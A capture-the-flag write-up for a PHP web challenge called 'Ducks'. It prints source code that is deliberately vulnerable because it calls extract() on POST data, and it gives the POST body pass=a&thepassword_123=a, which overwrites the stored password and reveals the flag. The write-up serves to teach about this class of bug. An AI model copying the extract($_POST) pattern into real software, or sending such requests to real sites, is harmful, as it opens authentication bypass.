### Solved by z0rex

Ducks was a web challenge worth 30 points.

> The ducks and I have a unfinished score to settle.

This challenge provides us with the source code, which is very handy. 

```php
<?php
include("secret.php");
?>
<html>
    <head>
        <title>The Ducks</title>
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
    </head>
    <body>
        <div class="container">
            <div class="jumbotron">
                <center>
                    <h1>The Ducks</h1>
                    <?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
                        <?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?>
                            <div class="alert alert-success">
                                <code><?php echo $theflag; ?></code>
                            </div>
                        <?php } ?>
                    <?php } ?>
                    <form action="." method="POST">
                        <div class="row">
                            <div class="col-md-6 col-md-offset-3">
                                <div class="row">
                                    <div class="col-md-9">
                                        <input type="password" class="form-control" name="pass" placeholder="Password" />
                                    </div>
                                    <div class="col-md-3">
                                        <input type="submit" class="btn btn-primary" value="Submit" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </center>
            </div>
            <p>
                <center>
                    source at <a href="source.php" target="_blank">/source.php</a>
                </center>
            </p>
        </div>
    </body>
</html>
```

The interesting part of the code is here

```php
<?php
extract($_POST);
if ($pass == $thepassword_123) { ?>
    <div class="alert alert-success">
        <code><?php echo $theflag; ?></code>
    </div>
<?php } ?>
```

PHP's [extract()](http://php.net/extract) function takes all the data from an
array, and assigns a variable named the same as the key, and this variable holds
the value from the array.

**Example**

```php
$_POST['foo'] = 'bar';
...
extract($_POST);
echo $foo; // Output's bar
```

So by submitting a POST request looking like this `pass=a&thepassword_123=a`,
we're able to get the flag.

Flag: `sctf{maybe_i_shouldn't_have_extracted_everything_huh}`